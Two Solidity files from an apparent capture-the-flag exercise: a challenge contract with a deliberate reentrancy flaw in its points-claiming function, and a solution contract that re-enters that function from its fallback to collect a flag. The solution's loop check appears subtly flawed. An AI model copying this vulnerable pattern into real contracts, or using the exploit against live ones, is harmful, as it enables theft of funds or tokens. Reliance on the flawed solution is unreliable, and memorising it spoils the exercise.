contracts/S1/Season1Challenge5.sol.content:
//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "../INFTFlags.sol";

contract Season1Challenge5 {
    address public nftContract;
    mapping(address => uint256) public points;
    uint256 public constant POINTS_TO_MINT = 10;

    constructor(address _nftContract) {
        nftContract = _nftContract;
    }

    function resetPoints() public {
        points[tx.origin] = 0;
    }

    function claimPoints() public {
        require(points[tx.origin] == 0, "Already claimed points");
        (bool success, ) = msg.sender.call("");
        require(success, "External call failed");

        points[tx.origin] += 1;
    }

    function mintFlag() public {
        require(points[tx.origin] >= POINTS_TO_MINT, "Not enough points");
        points[tx.origin] -= POINTS_TO_MINT;
        INFTFlags(nftContract).mint(tx.origin, 5);
    }
}

contracts/S1/Season1Challenge5Solution.s.content:
//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./Season1Challenge5.sol";

contract Season1Challenge5Solution {

    Season1Challenge5 private challenge5;

    constructor(address _season1Challenge5) {
        challenge5 = Season1Challenge5(_season1Challenge5);
    }

    function solve() public {
        challenge5.claimPoints();
    }

    fallback() external payable {
        // 1.通过fallback函数，递归调用claimPoints，直到达到points要求
        uint256 points = challenge5.points(msg.sender);
        // 1. 如果没达到points要求，递归调用
        if (points < 10) {
            challenge5.claimPoints();
        }
    }

    receive() external payable {
        
    }


}
